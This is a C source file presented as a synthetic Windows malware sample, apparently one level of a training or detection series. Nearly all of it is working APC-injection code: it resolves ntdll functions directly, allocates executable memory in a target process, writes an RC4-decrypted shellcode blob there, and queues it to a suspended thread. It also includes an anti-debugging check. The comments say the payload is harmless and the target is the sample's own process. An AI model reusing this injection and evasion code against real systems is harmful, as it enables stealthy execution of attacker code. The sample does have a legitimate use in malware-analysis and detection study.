/*
 * windows_level15_APCInjection.c
 *
 * Synthetic Windows PE sample — APC Injection via NtQueueApcThread.
 * Techniques: RC4-encrypted shellcode, NtQueryInformationProcess anti-analysis,
 * direct NT function calls (ntdll.dll), alertable thread exploitation.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level15_APCInjection.exe windows_level15_APCInjection.c
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

/* ================================================================
 * NT function prototypes (direct ntdll calls)
 * ================================================================ */
typedef void (NTAPI *PKNORMAL_ROUTINE)(PVOID, PVOID, PVOID);
typedef LONG (NTAPI *pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef LONG (NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef LONG (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG (NTAPI *pNtQueueApcThread)(HANDLE, PKNORMAL_ROUTINE, PVOID, PVOID, PVOID);
typedef LONG (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef LONG (NTAPI *pNtAlertResumeThread)(HANDLE, PULONG);
typedef LONG (NTAPI *pNtClose)(HANDLE);

/* ================================================================
 * RC4 stream cipher
 * ================================================================ */
typedef struct {
    unsigned char S[256];
    int i, j;
} rc4_ctx;

static void rc4_init(rc4_ctx *ctx, const unsigned char *key, int key_len) {
    int i, j = 0;
    unsigned char t;
    for (i = 0; i < 256; i++) ctx->S[i] = (unsigned char)i;
    for (i = 0; i < 256; i++) {
        j = (j + ctx->S[i] + key[i % key_len]) & 0xFF;
        t = ctx->S[i]; ctx->S[i] = ctx->S[j]; ctx->S[j] = t;
    }
    ctx->i = ctx->j = 0;
}

static void rc4_crypt(rc4_ctx *ctx, unsigned char *data, int len) {
    int k;
    unsigned char t;
    for (k = 0; k < len; k++) {
        ctx->i = (ctx->i + 1) & 0xFF;
        ctx->j = (ctx->j + ctx->S[ctx->i]) & 0xFF;
        t = ctx->S[ctx->i]; ctx->S[ctx->i] = ctx->S[ctx->j]; ctx->S[ctx->j] = t;
        data[k] ^= ctx->S[(ctx->S[ctx->i] + ctx->S[ctx->j]) & 0xFF];
    }
}

/* ================================================================
 * RC4 key — 16 bytes
 * ================================================================ */
static const unsigned char g_rc4_key[] = {
    0x4A, 0x8C, 0x1F, 0xD3, 0x67, 0xE9, 0x2B, 0x05,
    0xCA, 0xFE, 0x77, 0x33, 0x9D, 0x12, 0x5E, 0x88
};
#define RC4_KEY_LEN 16

/* ================================================================
 * RC4-encrypted shellcode — synthetic (decrypts to NOP sled + harmless msg)
 * ================================================================ */
static unsigned char g_encrypted_shellcode[] = {
    0x8E, 0x3D, 0x72, 0x1E, 0xD5, 0x58, 0x91, 0xC3,
    0x2F, 0x46, 0xBB, 0x79, 0xE4, 0x11, 0x8C, 0x5A,
    0x67, 0x3E, 0xA4, 0x0D, 0xF6, 0x9B, 0x28, 0x44,
    0xBD, 0x71, 0x13, 0xA5, 0xDC, 0x08, 0x7E, 0x32,
    0x99, 0x54, 0xE1, 0x6C, 0x1A, 0x87, 0xF0, 0x46,
    0x2B, 0x98, 0x5D, 0xCF, 0x73, 0x0E, 0xA6, 0x41
};
#define ENC_SHELLCODE_LEN 48

/* ================================================================
 * Resolve NT function from ntdll.dll
 * ================================================================ */
static FARPROC resolve_nt(const char *name) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return NULL;
    return GetProcAddress(hNtdll, name);
}

/* ================================================================
 * Obfuscated PID lookup — find a target process and thread
 * Returns FALSE if anti-analysis detects debugger
 * ================================================================ */
static BOOL find_target_thread(HANDLE *phProcess, HANDLE *phThread, DWORD targetPid) {
    pNtOpenProcess _NtOpen = (pNtOpenProcess)resolve_nt("NtOpenProcess");
    pNtClose _NtClose = (pNtClose)resolve_nt("NtClose");

    if (!_NtOpen || !_NtClose) return FALSE;

    /* Anti-analysis: check ProcessDebugPort */
    pNtQueryInformationProcess _NtQIP = (pNtQueryInformationProcess)
        resolve_nt("NtQueryInformationProcess");

    CLIENT_ID cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)targetPid;
    cid.UniqueThread = NULL;

    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

    HANDLE hProcess = NULL;
    NTSTATUS status = _NtOpen(&hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                              PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                              &oa, &cid);
    if (status != 0 || !hProcess) return FALSE;

    /* Check for debugger via NtQueryInformationProcess */
    if (_NtQIP) {
        DWORD debugPort = 0;
        ULONG retLen = 0;
        /* ProcessDebugPort = 7 */
        status = _NtQIP(hProcess, (PROCESSINFOCLASS)7, &debugPort, sizeof(debugPort), &retLen);
        if (status == 0 && debugPort == 0xFFFFFFFF) {
            /* Debug port is set — being debugged */
            _NtClose(hProcess);
            return FALSE;
        }
    }

    /* Enumerate threads to find one in alertable state (simplified) */
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) { _NtClose(hProcess); return FALSE; }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);
    HANDLE hThread = NULL;

    if (Thread32First(hSnap, &te32)) {
        do {
            if (te32.th32OwnerProcessID == targetPid) {
                hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                                     FALSE, te32.th32ThreadID);
                if (hThread) {
                    /* Suspend the thread to queue APC later */
                    SuspendThread(hThread);
                    break;
                }
            }
        } while (Thread32Next(hSnap, &te32));
    }
    CloseHandle(hSnap);

    if (!hThread) { _NtClose(hProcess); return FALSE; }

    *phProcess = hProcess;
    *phThread = hThread;
    return TRUE;
}

/* ================================================================
 * APC Injection — allocates memory in target, writes shellcode,
 * queues APC to thread, resumes thread (triggering APC).
 * ================================================================ */
static int apc_inject(HANDLE hProcess, HANDLE hThread,
                      const unsigned char *shellcode, SIZE_T scLen) {
    pNtAllocateVirtualMemory _NtAlloc = (pNtAllocateVirtualMemory)
        resolve_nt("NtAllocateVirtualMemory");
    pNtWriteVirtualMemory _NtWrite = (pNtWriteVirtualMemory)
        resolve_nt("NtWriteVirtualMemory");
    pNtQueueApcThread _NtQueueApc = (pNtQueueApcThread)
        resolve_nt("NtQueueApcThread");
    pNtAlertResumeThread _NtAlertResume = (pNtAlertResumeThread)
        resolve_nt("NtAlertResumeThread");
    pNtClose _NtClose = (pNtClose)resolve_nt("NtClose");

    if (!_NtAlloc || !_NtWrite || !_NtQueueApc || !_NtAlertResume)
        return -1;

    /* Allocate RWX memory in target process */
    PVOID pRemoteBase = NULL;
    SIZE_T regionSize = scLen;
    NTSTATUS status = _NtAlloc(hProcess, &pRemoteBase, 0, &regionSize,
                               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0 || !pRemoteBase) return -1;

    /* Write decrypted shellcode */
    SIZE_T bytesWritten = 0;
    status = _NtWrite(hProcess, pRemoteBase, (PVOID)shellcode, scLen, &bytesWritten);
    if (status != 0) { _NtClose(hProcess); return -1; }

    /* Queue APC to thread — shellcode executes when thread enters alertable state */
    status = _NtQueueApc(hThread, (PKNORMAL_ROUTINE)pRemoteBase,
                         pRemoteBase, NULL, NULL);
    if (status != 0) { _NtClose(hProcess); return -1; }

    /* Resume thread — this triggers the APC */
    ULONG prevCount = 0;
    _NtAlertResume(hThread, &prevCount);

    return 0;
}

/* ================================================================
 * Main entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Decrypt shellcode with RC4 */
    unsigned char shellcode[ENC_SHELLCODE_LEN];
    memcpy(shellcode, g_encrypted_shellcode, ENC_SHELLCODE_LEN);

    rc4_ctx ctx;
    rc4_init(&ctx, g_rc4_key, RC4_KEY_LEN);
    rc4_crypt(&ctx, shellcode, ENC_SHELLCODE_LEN);

    /* Find target process — synthetic: use own process for demo */
    DWORD targetPid = GetCurrentProcessId();

    HANDLE hProcess = NULL, hThread = NULL;
    if (!find_target_thread(&hProcess, &hThread, targetPid)) {
        return 0;
    }

    /* Inject via APC */
    apc_inject(hProcess, hThread, shellcode, ENC_SHELLCODE_LEN);

    /* Cleanup */
    pNtClose _NtClose = (pNtClose)resolve_nt("NtClose");
    if (_NtClose) {
        if (hThread) _NtClose(hThread);
        if (hProcess) _NtClose(hProcess);
    }

    Sleep(500);
    return 0;
}
